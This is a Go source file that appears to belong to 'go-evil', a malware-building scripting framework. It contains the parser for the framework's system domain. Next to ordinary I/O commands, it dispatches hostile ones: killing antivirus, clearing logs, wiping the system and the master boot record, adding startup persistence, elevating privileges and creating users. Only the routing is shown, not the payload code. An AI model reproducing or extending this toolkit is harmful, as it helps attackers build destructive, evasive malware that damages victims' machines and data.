package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/domains/system/io"
	"github.com/TeamPhoneix/go-evil/domains/system/processes"
	systemcommands "github.com/TeamPhoneix/go-evil/domains/system/system_commands"
	"github.com/TeamPhoneix/go-evil/domains/system/users"
	"github.com/TeamPhoneix/go-evil/domains/system/wipe"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// The main parser for the system domain
func Parser(function string, value string, s_json string) ([]string, string) {
	call := []string{}

	switch function {
	case "out":
		call, s_json = io.Out(s_json, value)

	case "outln":
		call, s_json = io.Outln(s_json, value)

	case "in":
		call, s_json = io.Input(s_json)

	case "exit":
		call, s_json = Exit(s_json, value)

	case "exec":
		call, s_json = Exec(s_json, value)

	case "abort":
		call, s_json = Abort(s_json, value)

	case "reboot":
		call, s_json = systemcommands.Reboot(s_json)

	case "shutdown":
		call, s_json = systemcommands.Shutdown(s_json)

	case "add_to_startup":
		call, s_json = Add_to_startup(s_json)

	case "list_dir":
		call, s_json = list_dir(s_json, value)

	case "write":
		call, s_json = io.Write(s_json, value)

	case "read":
		call, s_json = io.Read(s_json, value)

	case "remove":
		call, s_json = io.Remove(value, s_json)

	case "move":
		call, s_json = io.Move(value, s_json)

	case "copy":
		call, s_json = io.Copy(value, s_json)

	case "change_background":
		call, s_json = change_background(value, s_json)

	case "elevate":
		call, s_json = systemcommands.Elevate(value, s_json)

	case "create_user":
		call, s_json = users.Create(value, s_json)

	case "kill_process_id":
		call, s_json = processes.Kill_id(value, s_json)

	case "kill_process_name":
		call, s_json = processes.Kill_name(value, s_json)

	case "kill_antivirus":
		call, s_json = kill_antivirus(value, s_json)

	case "clear_logs":
		call, s_json = clear_logs(value, s_json)

	case "wipe_system":
		call, s_json = wipe.System(value, s_json)

	case "wipe_mbr":
		call, s_json = wipe.Mbr(value, s_json)

	case "get_disks":
		call, s_json = get_disks(value, s_json)

	case "get_users":
		call, s_json = users.Get(value, s_json)

	case "get_processes":
		call, s_json = processes.Get(value, s_json)

	case "get_processes_name":
		call, s_json = processes.Get_names(value, s_json)

	case "get_processes_pid":
		call, s_json = processes.Get_pids(value, s_json)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "system.Parser()")

	}

	return call, s_json
}
